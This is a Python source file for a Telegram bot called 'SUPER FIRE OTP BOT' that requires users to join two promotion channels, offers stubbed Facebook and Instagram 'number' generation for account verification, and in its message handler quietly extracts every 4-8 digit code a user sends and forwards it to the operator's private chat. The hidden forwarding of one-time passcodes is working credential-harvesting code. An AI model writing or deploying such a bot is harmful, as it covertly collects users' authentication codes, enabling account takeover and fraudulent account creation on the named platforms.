import logging
import re
import json
import os
import requests
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, MessageHandler, filters, CallbackContext, CommandHandler, CallbackQueryHandler
from telegram.constants import ParseMode
from dotenv import load_dotenv

load_dotenv()

TOKEN = os.getenv("BOT_TOKEN")
YOUR_CHAT_ID = int(os.getenv("YOUR_CHAT_ID") or 0)
SMS_API_KEY = os.getenv("SMS_API_KEY")

OTP_PATTERN = re.compile(r'\b(\d{4,8})\b')
DATA_FILE = "authorized_users.json"

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

def load_authorized_users():
    try:
        with open(DATA_FILE, 'r') as f:
            return set(json.load(f))
    except:
        return set()

def save_authorized_users(users):
    with open(DATA_FILE, 'w') as f:
        json.dump(list(users), f, indent=2)

authorized_users = load_authorized_users()

main_keyboard = ReplyKeyboardMarkup([
    [KeyboardButton("🎲 GET NUMBER"), KeyboardButton("🔐 2FA CODE")]
], resize_keyboard=True, is_persistent=True)

join_keyboard = InlineKeyboardMarkup([
    [InlineKeyboardButton("📢 Join Channel 1", url="https://t.me/EASY_MARKETING1")],
    [InlineKeyboardButton("📢 Join Channel 2", url="https://t.me/EASY_METHOD1")],
    [InlineKeyboardButton("✅ Verify", callback_data="verify_user")]
])

num_keyboard = InlineKeyboardMarkup([
    [InlineKeyboardButton("📘 Facebook Number", callback_data="num_fb")],
    [InlineKeyboardButton("📸 Instagram Number", callback_data="num_ig")],
    [InlineKeyboardButton("🔙 Back", callback_data="back_main")]
])

async def start(update: Update, context: CallbackContext):
    if update.effective_user.id in authorized_users:
        await update.message.reply_text("✅ **SUPER FIRE OTP BOT**\nUse buttons below:", reply_markup=main_keyboard)
    else:
        await update.message.reply_text("Join channels & Verify", reply_markup=join_keyboard)

async def handle_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "verify_user":
        authorized_users.add(query.from_user.id)
        save_authorized_users(authorized_users)
        try: await query.message.delete()
        except: pass
        await context.bot.send_message(query.from_user.id, "✅ Verified!", reply_markup=main_keyboard)

    elif data == "num_fb":
        await query.message.edit_text("🔄 Facebook Number generating...", reply_markup=num_keyboard)
        # API call here
        number = "Test Number +88017xxxxxxxx"  # Replace with real API later
        await query.message.reply_text(f"✅ Number: {number}", reply_markup=main_keyboard)

    elif data == "num_ig":
        await query.message.edit_text("🔄 Instagram Number generating...", reply_markup=num_keyboard)
        number = "Test Number +88018xxxxxxxx"
        await query.message.reply_text(f"✅ Number: {number}", reply_markup=main_keyboard)

    elif data == "back_main":
        await query.message.edit_text("Main Menu", reply_markup=main_keyboard)

async def handle_message(update: Update, context: CallbackContext):
    text = update.message.text
    if update.effective_user.id not in authorized_users:
        await update.message.reply_text("Verify first", reply_markup=join_keyboard)
        return

    if text == "🎲 GET NUMBER":
        await update.message.reply_text("Select Service:", reply_markup=num_keyboard)
    elif text == "🔐 2FA CODE":
        await update.message.reply_text("2FA coming soon...", reply_markup=main_keyboard)
    else:
        otps = OTP_PATTERN.findall(text)
        if otps:
            for otp in otps:
                await context.bot.send_message(YOUR_CHAT_ID, f"🔥 OTP: {otp}")

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    print("🚀 Bot Running...")
    app.run_polling()

if __name__ == '__main__':
    main()
